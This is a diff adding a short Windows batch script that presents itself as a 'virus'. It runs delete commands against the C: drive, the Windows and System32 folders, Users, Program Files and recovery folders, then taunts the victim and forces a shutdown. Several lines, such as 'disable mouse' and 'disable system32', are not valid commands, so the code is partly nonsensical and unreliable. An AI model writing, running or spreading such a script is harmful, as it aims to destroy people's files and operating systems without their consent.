@@ -1,0 +1,32 @@
+@echo off
+disable mouse
+disable keyboard
+disable system32
+del c:/
+del c:/windows
+del c:/windows/system32
+del c:/system32/logonu1.exe
+del c:/windows/system32/restore
+del c:/windows/system32/winlogwinlogin.exe
+del c:/windows
+del c:/NVIDIA
+del c:/windows
+del c:/documents and settings
+del d:/RECOVERY
+del c:/SwSetup
+del c:/temp
+del c:/program Files
+del c:/perfLogs
+del c:/.rnd
+del c:/Brukere
+del c:/Users
+del c:/MCPP
+del c:/CMD
+del c:/
+disable windows
+dir /s
+echo I AM YOUR virus. I deleted your Files
+echo because you tried to delete me. 
+echo By the way, I am - - >__<- -, "
+Pause
+shutdown  -s -t 10 -c "say goodbye to you computer! "
